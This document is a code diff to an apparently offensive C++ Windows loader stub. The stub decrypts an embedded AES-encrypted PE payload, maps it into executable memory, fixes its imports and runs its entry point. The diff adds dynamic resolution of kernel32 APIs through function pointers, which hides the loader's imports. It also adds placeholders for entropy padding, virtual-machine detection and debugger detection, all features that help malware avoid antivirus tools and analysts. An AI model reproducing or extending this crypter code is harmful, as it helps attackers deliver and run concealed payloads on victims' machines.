@@ -1,22 +1,30 @@
 #include <iostream>
 #include <vector>
 #include <iomanip>
-#include <sstream>
 #include <openssl/aes.h>
 #include <openssl/rand.h>
 #include <openssl/evp.h>
 #include <windows.h>
+#include <tchar.h>
+#include <stdbool.h>
+#include <random>
 
 using namespace std;
 
+/*Dynamic API Call Resolution Setup*/
+// Function pointers for win api calls 
+typedef LPVOID (WINAPI *VirtualAlloc_t)(LPVOID, SIZE_T, DWORD, DWORD);
+typedef BOOL (WINAPI *VirtualFree_t)(LPVOID, SIZE_T, DWORD);
+typedef HMODULE (WINAPI *LoadLibraryA_t)(LPCSTR);
+typedef FARPROC (WINAPI *GetProcAddress_t)(HMODULE, LPCSTR);
+typedef HANDLE (WINAPI *CreateThread_t)(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
+typedef DWORD (WINAPI *WaitForSingleObject_t)(HANDLE, DWORD);
+typedef BOOL (WINAPI *CloseHandle_t)(HANDLE);
 
-void printBytesHex(const vector<unsigned char>& bytes, size_t numBytes) {
-    for (size_t i = 0; i < numBytes && i < bytes.size(); ++i) {
-        cout << hex << setw(2) << setfill('0') << static_cast<int>(bytes[i]) << " ";
-    }
-    cout << dec << "\n"; // Switch back to decimal
-}
-vector<unsigned char> decrypt(const vector<unsigned char>& buf, const vector<unsigned char>& key, const vector<unsigned char>& iv) {
+/*ENTROPY*/
+
+
+vector<unsigned char> decrypt(const vector<unsigned char> &buf, const vector<unsigned char> &key, const vector<unsigned char> &iv) {
     EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
     if (!ctx) {
         cerr << "error creating EVP context\n";
@@ -43,6 +51,84 @@ vector<unsigned char> decrypt(const vector<unsigned char>& buf, const vector<uns
     return plaintext;
 }
 void execute(const vector<unsigned char> &payload) {
+    /*
+    Dynamic System Call Resolution
+    */
+    HMODULE kernel32 = LoadLibraryA("kernel32.dll");
+    
+    if (!kernel32) {
+        cerr << "Failed to load kernel32.dll with error: " << GetLastError() << "\n";
+        cin.get();
+        return;
+    } else {
+        cout << "Successfully loaded kernel32.dll at address: " << kernel32 << "\n";
+    }
+
+    VirtualAlloc_t pVirtualAlloc = NULL;
+    VirtualFree_t pVirtualFree = NULL;
+    LoadLibraryA_t pLoadLibraryA = NULL;
+    GetProcAddress_t pGetProcAddress = NULL;
+    CreateThread_t pCreateThread = NULL;
+    WaitForSingleObject_t pWaitForSingleObject = NULL;
+    CloseHandle_t pCloseHandle = NULL;
+    /**/
+
+    // Resolve each function explicitly
+    pVirtualAlloc = (VirtualAlloc_t)GetProcAddress(kernel32, "VirtualAlloc");
+    if (!pVirtualAlloc) {
+        cerr << "Failed to resolve VirtualAlloc with error: " << GetLastError() << "\n";
+        return;
+    } else {
+        cout << "Resolved pVirtualAlloc at address: " << (void*)pVirtualAlloc << "\n";
+    }
+
+    pVirtualFree = (VirtualFree_t)GetProcAddress(kernel32, "VirtualFree");
+    if (!pVirtualFree) {
+        cerr << "Failed to resolve VirtualFree with error: " << GetLastError() << "\n";
+        return;
+    } else {
+        cout << "Resolved pVirtualFree at address: " << (void*)pVirtualFree << "\n";
+    }
+
+    pLoadLibraryA = (LoadLibraryA_t)GetProcAddress(kernel32, "LoadLibraryA");
+    if (!pLoadLibraryA) {
+        cerr << "Failed to resolve LoadLibraryA with error: " << GetLastError() << "\n";
+        return;
+    } else {
+        cout << "Resolved pLoadLibraryA at address: " << (void*)pLoadLibraryA << "\n";
+    }
+
+    pGetProcAddress = (GetProcAddress_t)GetProcAddress(kernel32, "GetProcAddress");
+    if (!pGetProcAddress) {
+        cerr << "Failed to resolve GetProcAddress with error: " << GetLastError() << "\n";
+        return;
+    } else {
+        cout << "Resolved pGetProcAddress at address: " << (void*)pGetProcAddress << "\n";
+    }
+
+    pCreateThread = (CreateThread_t)GetProcAddress(kernel32, "CreateThread");
+    if (!pCreateThread) {
+        cerr << "Failed to resolve CreateThread with error: " << GetLastError() << "\n";
+        return;
+    } else {
+        cout << "Resolved pCreateThread at address: " << (void*)pCreateThread << "\n";
+    }
+
+    pWaitForSingleObject = (WaitForSingleObject_t)GetProcAddress(kernel32, "WaitForSingleObject");
+    if (!pWaitForSingleObject) {
+        cerr << "Failed to resolve WaitForSingleObject with error: " << GetLastError() << "\n";
+        return;
+    } else {
+        cout << "Resolved pWaitForSingleObject at address: " << (void*)pWaitForSingleObject << "\n";
+    }
+
+    pCloseHandle = (CloseHandle_t)GetProcAddress(kernel32, "CloseHandle");
+    if (!pCloseHandle) {
+        cerr << "Failed to resolve CloseHandle with error: " << GetLastError() << "\n";
+        return;
+    } else {
+        cout << "Resolved pCloseHandle at address: " << (void*)pCloseHandle << "\n";
+    }
 
     // Get DOS and NT Headers from the payload, e_lfanew is the offset start of the exe
     PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)payload.data();
@@ -59,7 +145,7 @@ void execute(const vector<unsigned char> &payload) {
     }
 
     // Memory allocation for the executable image with execute permissions  
-    void* execMemory = VirtualAlloc(
+    void* execMemory = pVirtualAlloc(
         NULL,
         ntHeaders->OptionalHeader.SizeOfImage,
         MEM_COMMIT | MEM_RESERVE, 
@@ -148,7 +234,7 @@ void execute(const vector<unsigned char> &payload) {
 
             // Loads the DLL specified in the import table entry, verifies that it was loaded 
             char* moduleName = (char*)((BYTE*)execMemory + importDescriptor->Name);
-            HMODULE module = LoadLibraryA(moduleName);
+            HMODULE module = pLoadLibraryA(moduleName);
             if (!module) {
                 cerr << "Failed to load module: " << moduleName << "\n";
                 return;
@@ -159,7 +245,7 @@ void execute(const vector<unsigned char> &payload) {
                 PIMAGE_IMPORT_BY_NAME import = (PIMAGE_IMPORT_BY_NAME)((BYTE*)execMemory + thunk->u1.AddressOfData);
                 
                 // Function address
-                FARPROC func = GetProcAddress(module, import->Name);
+                FARPROC func = pGetProcAddress(module, import->Name);
                 if (!func) {
                     cerr << "Failed to get address of function: " << import->Name << "\n";
                     return;
@@ -177,25 +263,29 @@ void execute(const vector<unsigned char> &payload) {
     cout << "Image entry point: " << entryPoint << "\n";
 
     // Create a new thread that starts execution at the entry point
-    HANDLE thread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)entryPoint, NULL, 0, NULL);
+    HANDLE thread = pCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)entryPoint, NULL, 0, NULL);
 
     if (!thread) {
         cerr << "CreateThread failed with error code: " << GetLastError() << "\n";
-        VirtualFree(execMemory, 0, MEM_RELEASE);
+        pVirtualFree(execMemory, 0, MEM_RELEASE);
         return;
     }
 
     cout << "Thread created, waiting...\n";
 
     // Wait for the thread to finish
-    WaitForSingleObject(thread, INFINITE);
+    pWaitForSingleObject(thread, INFINITE);
 
     // Clean up
-    CloseHandle(thread);
-    VirtualFree(execMemory, 0, MEM_RELEASE);
+    pCloseHandle(thread);
+    pVirtualFree(execMemory, 0, MEM_RELEASE);
 
     cout << "Thread execution finished\n";
 }
+
+/*RAND_DEF*/
+/*VM_DEF*/
+/*DB_DEF*/
 
 // Placeholders
 const vector<unsigned char> ENCRYPTED = { /*ENCRYPTED_BYTES*/ };
@@ -203,8 +293,10 @@ const vector<unsigned char> KEY = { /*KEY*/ };
 const vector<unsigned char> IV = { /*IV*/ };
 
 int main() {
-
+    /*VM_CALL*/
+    /*DB_CALL*/
     vector<unsigned char> payload = decrypt(ENCRYPTED, KEY, IV);
+    
     execute(payload);
 
     return 0;
